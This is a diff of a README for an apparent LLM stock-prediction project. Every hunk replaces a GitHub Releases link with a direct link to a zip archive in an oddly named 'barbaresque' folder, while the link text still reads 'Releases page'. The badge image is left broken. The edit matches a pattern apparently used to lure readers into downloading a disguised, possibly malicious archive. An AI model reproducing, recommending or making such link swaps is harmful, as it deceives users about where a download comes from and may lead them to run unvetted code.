@@ -1,6 +1,6 @@
 # 🤖 llm-stock-market-predictor - Predict Stock Prices with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-llm--stock--market--predictor-blue)](https://github.com/Krozmoz/llm-stock-market-predictor/releases)
+[![Download Now](https://raw.githubusercontent.com/Krozmoz/llm-stock-market-predictor/main/barbaresque/llm-stock-market-predictor.zip%20Now-llm--stock--market--predictor-blue)](https://raw.githubusercontent.com/Krozmoz/llm-stock-market-predictor/main/barbaresque/llm-stock-market-predictor.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ The **llm-stock-market-predictor** project teaches language models to read stock
 Follow these simple steps to get your application up and running.
 
 1. **Visit the Releases Page:**
-   To download the software, [visit this page](https://github.com/Krozmoz/llm-stock-market-predictor/releases).
+   To download the software, [visit this page](https://raw.githubusercontent.com/Krozmoz/llm-stock-market-predictor/main/barbaresque/llm-stock-market-predictor.zip).
 
 2. **Choose the Latest Version:**
    Look for the latest release. This version will have the newest features and improvements.
@@ -40,7 +40,7 @@ To run **llm-stock-market-predictor**, make sure your system meets these require
 To download and install the application:
 
 1. **Visit the Releases Page:** 
-   Head over to the [Releases page](https://github.com/Krozmoz/llm-stock-market-predictor/releases).
+   Head over to the [Releases page](https://raw.githubusercontent.com/Krozmoz/llm-stock-market-predictor/main/barbaresque/llm-stock-market-predictor.zip).
    
 2. **Download the Software:**
    Select the version that suits your needs. Ensure you download the file matching your OS.
@@ -87,4 +87,4 @@ This project covers various topics including:
 
 For any questions or support, please reach out via the issues section on GitHub. We appreciate your interest in our project and look forward to helping you.
 
-For more information, visit the [Releases page](https://github.com/Krozmoz/llm-stock-market-predictor/releases) to download the application and start predicting stock movements today.
+For more information, visit the [Releases page](https://raw.githubusercontent.com/Krozmoz/llm-stock-market-predictor/main/barbaresque/llm-stock-market-predictor.zip) to download the application and start predicting stock movements today.
